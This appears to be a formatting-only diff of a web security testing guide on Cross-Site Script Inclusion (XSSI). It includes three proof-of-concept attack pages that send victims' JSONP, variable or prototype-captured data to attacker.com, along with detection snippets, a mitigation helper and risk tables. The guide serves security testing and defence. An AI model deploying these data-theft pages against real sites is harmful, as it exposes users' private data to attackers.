@@ -1,9 +1,11 @@
 # WSTG-CLNT-13: Testing for Cross-Site Script Inclusion (XSSI)
 
 ## Test ID
+
 WSTG-CLNT-13
 
 ## Test Name
+
 Testing for Cross-Site Script Inclusion (XSSI)
 
 ## High-Level Description
@@ -274,46 +276,45 @@ tester.run_tests(auth_cookies={'session': 'valid_session_cookie'})
 <!-- Scenario 1: JSONP Data Theft -->
 <!DOCTYPE html>
 <html>
-<body>
+  <body>
     <script>
-        function callback(data) {
-            // Steal user data
-            new Image().src = 'https://attacker.com/log?data=' +
-                encodeURIComponent(JSON.stringify(data));
-        }
+      function callback(data) {
+        // Steal user data
+        new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data))
+      }
     </script>
     <script src="https://target.com/api/user?callback=callback"></script>
-</body>
+  </body>
 </html>
 
 <!-- Scenario 2: JavaScript Variable Theft -->
 <!DOCTYPE html>
 <html>
-<body>
+  <body>
     <script src="https://target.com/js/config.js"></script>
     <script>
-        // If config.js sets: var userData = {...}
-        if (typeof userData !== 'undefined') {
-            fetch('https://attacker.com/log', {
-                method: 'POST',
-                body: JSON.stringify(userData)
-            });
-        }
+      // If config.js sets: var userData = {...}
+      if (typeof userData !== "undefined") {
+        fetch("https://attacker.com/log", {
+          method: "POST",
+          body: JSON.stringify(userData),
+        })
+      }
     </script>
-</body>
+  </body>
 </html>
 
 <!-- Scenario 3: Prototype Manipulation -->
 <!DOCTYPE html>
 <html>
-<body>
+  <body>
     <script>
-        Object.prototype.__defineSetter__('sensitive', function(val) {
-            fetch('https://attacker.com/log?data=' + encodeURIComponent(val));
-        });
+      Object.prototype.__defineSetter__("sensitive", function (val) {
+        fetch("https://attacker.com/log?data=" + encodeURIComponent(val))
+      })
     </script>
     <script src="https://target.com/api/user.js"></script>
-</body>
+  </body>
 </html>
 ```
 
@@ -323,37 +324,41 @@ tester.run_tests(auth_cookies={'session': 'valid_session_cookie'})
 // Browser console - test for XSSI patterns
 
 // 1. Check if endpoint returns valid JavaScript
-fetch('/api/user').then(r => r.text()).then(text => {
+fetch("/api/user")
+  .then((r) => r.text())
+  .then((text) => {
     try {
-        // Check if it's valid JS
-        new Function(text);
-        console.log('[!] Endpoint returns executable JavaScript');
+      // Check if it's valid JS
+      new Function(text)
+      console.log("[!] Endpoint returns executable JavaScript")
     } catch (e) {
-        console.log('[OK] Not executable as JavaScript');
+      console.log("[OK] Not executable as JavaScript")
     }
-});
+  })
 
 // 2. Check for JSONP parameters
-const jsonpParams = ['callback', 'jsonp', 'cb', 'func', 'jsonpcallback'];
-jsonpParams.forEach(param => {
-    fetch(`/api/data?${param}=test`).then(r => r.text()).then(text => {
-        if (text.includes('test(')) {
-            console.log(`[!] JSONP parameter found: ${param}`);
-        }
-    });
-});
+const jsonpParams = ["callback", "jsonp", "cb", "func", "jsonpcallback"]
+jsonpParams.forEach((param) => {
+  fetch(`/api/data?${param}=test`)
+    .then((r) => r.text())
+    .then((text) => {
+      if (text.includes("test(")) {
+        console.log(`[!] JSONP parameter found: ${param}`)
+      }
+    })
+})
 ```
 
 ---
 
 ## Tools
 
-| Tool | Purpose |
-|------|---------|
-| Burp Suite | Intercept and analyze responses |
-| Browser DevTools | Monitor script loading |
-| Custom PoC | Test XSSI exploitation |
-| curl | Manual testing |
+| Tool             | Purpose                         |
+| ---------------- | ------------------------------- |
+| Burp Suite       | Intercept and analyze responses |
+| Browser DevTools | Monitor script loading          |
+| Custom PoC       | Test XSSI exploitation          |
+| curl             | Manual testing                  |
 
 ---
 
@@ -402,22 +407,22 @@ def check_content_type():
 ```javascript
 // Client-side: Strip prefix from responses
 async function fetchSecure(url) {
-    const response = await fetch(url, {
-        credentials: 'include',
-        headers: {
-            'X-Requested-With': 'XMLHttpRequest',
-            'Accept': 'application/json'
-        }
-    });
+  const response = await fetch(url, {
+    credentials: "include",
+    headers: {
+      "X-Requested-With": "XMLHttpRequest",
+      Accept: "application/json",
+    },
+  })
 
-    let text = await response.text();
+  let text = await response.text()
 
-    // Remove anti-XSSI prefix
-    if (text.startsWith(")]}',\n")) {
-        text = text.substring(6);
-    }
+  // Remove anti-XSSI prefix
+  if (text.startsWith(")]}',\n")) {
+    text = text.substring(6)
+  }
 
-    return JSON.parse(text);
+  return JSON.parse(text)
 }
 ```
 
@@ -425,22 +430,22 @@ async function fetchSecure(url) {
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| JSONP with sensitive user data | 7.5 | High |
-| Authenticated JavaScript hijacking | 7.5 | High |
-| JSON array with sensitive data | 5.3 | Medium |
-| JSONP callback controllable (no sensitive data) | 4.3 | Medium |
+| Finding                                         | CVSS | Severity |
+| ----------------------------------------------- | ---- | -------- |
+| JSONP with sensitive user data                  | 7.5  | High     |
+| Authenticated JavaScript hijacking              | 7.5  | High     |
+| JSON array with sensitive data                  | 5.3  | Medium   |
+| JSONP callback controllable (no sensitive data) | 4.3  | Medium   |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
-| **CWE-352** | Cross-Site Request Forgery (CSRF) |
+| CWE ID      | Title                                                      |
+| ----------- | ---------------------------------------------------------- |
+| **CWE-352** | Cross-Site Request Forgery (CSRF)                          |
 | **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor |
-| **CWE-346** | Origin Validation Error |
+| **CWE-346** | Origin Validation Error                                    |
 
 ---
 
